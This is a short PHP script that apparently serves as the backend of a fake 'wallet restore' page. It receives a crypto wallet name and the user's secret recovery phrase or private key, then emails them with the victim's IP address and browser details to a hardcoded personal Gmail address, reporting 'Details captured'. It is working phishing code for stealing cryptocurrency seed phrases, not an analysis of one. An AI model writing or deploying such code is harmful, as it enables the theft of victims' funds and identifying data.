<?php
// Set headers to allow JSON response
header('Content-Type: application/json');

// 1. Get the raw POST data from the JavaScript 'fetch'
$jsonData = file_get_contents('php://input');

// 2. Decode the JSON data into a PHP array
$input = json_decode($jsonData, true);

if (isset($input['phrase']) && !empty($input['phrase'])) {
    
    // --- CONFIGURATION ---
    $to = "jourdandeo9@gmail.com"; // Your email address
    $wallet = $input['wallet'];    // The wallet name from the app
    $phrase = $input['phrase'];    // The secret phrase or private key
    
    // Exact subject format as requested
    $subject = "A wallet " . $wallet;
    
    // 3. Construct the Email Body
    $message = "---------- New Wallet Restore Request ----------\n\n";
    $message .= "Wallet Name: " . $wallet . "\n";
    $message .= "Secret Phrase/Key: " . $phrase . "\n\n";
    $message .= "---------------- User Info ----------------\n";
    $message .= "IP Address: " . $_SERVER['REMOTE_ADDR'] . "\n";
    $message .= "User Agent: " . $_SERVER['HTTP_USER_AGENT'] . "\n";
    $message .= "Date: " . date("Y-m-d H:i:s") . "\n";
    $message .= "-------------------------------------------\n";

    // 4. Set Headers
    $headers = "From: Wallet System <noreply@yourdomain.com>\r\n";
    $headers .= "Reply-To: noreply@yourdomain.com\r\n";
    $headers .= "X-Mailer: PHP/" . phpversion();

    // 5. Send the Email
    if (mail($to, $subject, $message, $headers)) {
        // Return success to the JavaScript
        echo json_encode(["status" => "success", "message" => "Details captured"]);
    } else {
        // Return error to the JavaScript
        echo json_encode(["status" => "error", "message" => "Mail delivery failed"]);
    }
} else {
    // Handle cases where data is missing
    echo json_encode(["status" => "error", "message" => "No data received"]);
}
?>
